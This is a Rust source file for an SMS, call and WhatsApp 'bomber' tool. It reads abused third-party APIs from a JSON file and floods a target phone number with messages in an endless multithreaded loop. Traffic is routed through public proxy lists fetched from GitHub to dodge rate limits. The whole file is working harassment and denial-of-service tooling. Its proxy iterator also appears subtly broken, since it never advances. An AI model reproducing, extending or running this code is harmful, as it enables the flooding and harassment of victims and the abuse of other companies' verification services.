use std::env::args;
use std::fmt::{Display, Formatter};
use std::fs::read_to_string;
use std::io::stdin;

use md5::compute;
use reqwest::blocking::get;
use serde_json::{from_str, Value};
use threadpool::ThreadPool;

use crate::bomb_method::{BombMethod, CustomSmsBomb, MixBomb, SmsCallBomb, SmsType};
use crate::rest_api::RestAPI;

mod bomb_method;
mod rest_api;

const BLACKLIST: [&str; 4] = [
    "6a41f8729a4f8a785cd87d07ee17f513",
    "42769009d3d19557eef3bc1d7a4b76c1",
    "fbebb370bab2e750178419960b644ec0",
    "ee7a4e6cdf8be80d61ca6cd780a7e1b0"
];

fn encode_md5(input: &str) -> String {
    format!("{:x}", compute(input.as_bytes()))
}

fn main() {
    println!("Reading file!");
    let api_json: Value = {
        let api_str = read_to_string("apidata.json").expect("Failed to open API data file");
        from_str(&api_str).expect("Failed to parse API data file")
    };

    let mut bomb_type = String::new();
    println!("Enter bomb type: ");
    println!("1 > Sms");
    println!("2 > Call");
    println!("3 > Whatsapp");
    println!("4 > Custom Message");
    println!("5 > Mix Master 69 (Sms + Call + Whatsapp + Custom)");
    println!("6 > Exit");
    println!();
    stdin().read_line(&mut bomb_type).expect("Failed to read line");
    let bomb_type: u8 = bomb_type.trim().parse().expect("Failed to parse bomb type");
    if bomb_type > 5 || bomb_type < 1 {
        return;
    }

    let mut method: Box<dyn BombMethod> = if bomb_type == 4 {
        Box::new(CustomSmsBomb::new())
    } else if bomb_type == 5 {
        Box::new(MixBomb::new())
    } else {
        let bomb_type = match bomb_type {
            1 => SmsType::SMS,
            2 => SmsType::CALL,
            3 => SmsType::WHATSAPP,
            _ => panic!("Invalid bomb type")
        };
        Box::new(SmsCallBomb::new(bomb_type))
    };
    println!();

    let args: Vec<String> = args().collect();
    if args.len() > 0 {
        if args.last().unwrap().as_str().eq("single") {
            if bomb_type > 4 {
                return;
            }
            println!("Enter api path:");
            let mut api_path = String::new();
            stdin().read_line(&mut api_path).expect("Failed to read line");
            let mut value = &api_json;
            value = value.get(method.name().as_str()).unwrap();
            value = &value.get(api_path.trim()).expect("Invalid API path");
            let rest_api = RestAPI::from_json(value.as_object().expect("Invalid API path")).expect("Failed to parse API");
            method.input().expect("Failed to read input");

            let formatting = &method.get_formatting();
            method.apis().insert(api_path, rest_api.format(&formatting));
            let thread_pool = ThreadPool::new(1);
            let mut iter = InfIterator::default();
            method.run(&thread_pool, &None, &mut iter).expect("Failed to run bomb");
            thread_pool.join();
            return;
        }
    }

    method.input().unwrap();
    method.load(&api_json.as_object().unwrap()).expect("Failed to load API data");
    println!("Loaded {} APIs", method.apis().len());
    println!();

    let mut proxy_type = String::new();
    println!("Enter proxy type: (Optional)");
    println!("1 > HTTP");
    println!("2 > HTTPS");
    println!("3 > SOCKS5");
    println!("4 > NONE");
    println!();
    stdin().read_line(&mut proxy_type).expect("Failed to read line");
    let proxy_type: u8 = proxy_type.trim().parse().expect("Failed to parse proxy type");
    let proxy_type = match proxy_type {
        1 => Some(ProxyType::HTTP),
        2 => Some(ProxyType::HTTPS),
        3 => Some(ProxyType::SOCKS5),
        _ => None
    };

    let mut iterator = match &proxy_type {
        Some(t) => {
            println!("Enter proxy list url: (Default: {})", t.default_link());
            let mut proxy_list = String::new();
            stdin().read_line(&mut proxy_list).expect("Failed to read line");
            if proxy_list.trim().is_empty() {
                proxy_list = t.default_link().to_string();
            }

            let result = get(proxy_list.trim());
            let proxy_list = match result {
                Ok(r) => {
                    let option = r.text_with_charset("UTF-8");
                    match option {
                        Ok(s) => Some(s),
                        _ => None
                    }
                }
                _ => None
            };

            let l = format!("{}", t).to_ascii_lowercase();
            let vec: Vec<String> = proxy_list.unwrap_or(String::from("")).split("\n").map(|s| String::from(format!("{l}://{s}"))).collect();
            InfIterator::new(vec)
        }
        None => InfIterator::default()
    };

    println!("Enter number of threads:");
    let mut number_of_threads = String::new();
    stdin().read_line(&mut number_of_threads).expect("Failed to read number of threads");
    let number_of_threads = number_of_threads.trim().parse::<u32>().expect("Failed to parse number of threads");
    println!("Starting {} threads", number_of_threads);
    let thread_pool = ThreadPool::with_name(String::from("Worker"), number_of_threads as usize);
    loop {
        method.run(&thread_pool, &proxy_type, &mut iterator).unwrap();
        if thread_pool.queued_count() > thread_pool.max_count() {
            thread_pool.join();
        }
    }
}

#[derive(Clone, Debug)]
pub enum ProxyType {
    HTTP,
    HTTPS,
    SOCKS5,
}

impl Display for ProxyType {
    fn fmt(&self, f: &mut Formatter<'_>) -> std::fmt::Result {
        match self {
            ProxyType::HTTP => write!(f, "HTTP"),
            ProxyType::HTTPS => write!(f, "HTTPS"),
            ProxyType::SOCKS5 => write!(f, "SOCKS5")
        }
    }
}

impl ProxyType {
    pub fn default_link(&self) -> String {
        match self {
            ProxyType::HTTP => String::from("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"),
            ProxyType::HTTPS => String::from("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt"),
            ProxyType::SOCKS5 => String::from("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt")
        }
    }
}

#[derive(Debug, Clone)]
pub struct InfIterator {
    current: usize,
    max: usize,
    list: Vec<String>,
}

impl Default for InfIterator {
    fn default() -> Self {
        Self::new(Vec::new())
    }
}

impl InfIterator {
    pub fn new(lst: Vec<String>) -> Self {
        Self {
            current: 0,
            max: lst.len(),
            list: lst.clone(),
        }
    }

    pub fn next(&mut self) -> String {
        if self.list.is_empty() {
            return String::from("");
        }
        if self.current >= self.max {
            self.current = 0;
        }
        self.list[self.current].clone()
    }
}